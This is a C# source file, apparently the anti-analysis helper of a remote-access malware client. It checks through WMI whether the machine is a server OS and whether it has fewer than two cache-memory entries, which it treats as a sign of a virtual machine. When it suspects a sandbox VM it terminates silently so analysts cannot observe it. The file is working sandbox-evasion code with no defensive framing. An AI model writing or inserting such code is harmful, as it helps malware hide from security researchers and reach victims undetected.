using System;
using System.Linq;
using System.Management;

namespace Client.Helper
{
    internal class Anti_Analysis
    {
        public static void RunAntiAnalysis()
        {
            if (!IsServerOS() && isVM_by_wim_temper()) Environment.FailFast(null);
        }

        public static bool IsServerOS()
        {
            try
            {
                var computerName = Environment.MachineName;
                var options = new ConnectionOptions
                    { EnablePrivileges = true, Impersonation = ImpersonationLevel.Impersonate };
                var scope = new ManagementScope(string.Format(@"\\{0}\root\CIMV2", computerName), options);
                var query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");

                using (var searcher = new ManagementObjectSearcher(scope, query))
                using (var results = searcher.Get())
                {
                    if (results.Count != 1) throw new ManagementException();

                    var productType = (uint)results.OfType<ManagementObject>().First().Properties["ProductType"].Value;

                    switch (productType)
                    {
                        case 1:
                            return false;
                        case 2:
                            return true;
                        case 3:
                            return true;
                        default:
                            return false;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool isVM_by_wim_temper()
        {
            try
            {
                var selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
                //SelectQuery selectQuery = new SelectQuery("Select * from CIM_Memory");
                var searcher = new ManagementObjectSearcher(selectQuery);
                var i = 0;
                foreach (ManagementObject DeviceID in searcher.Get())
                    i++;
                return i < 2;
            }
            catch
            {
                return true;
            }
        }
    }
}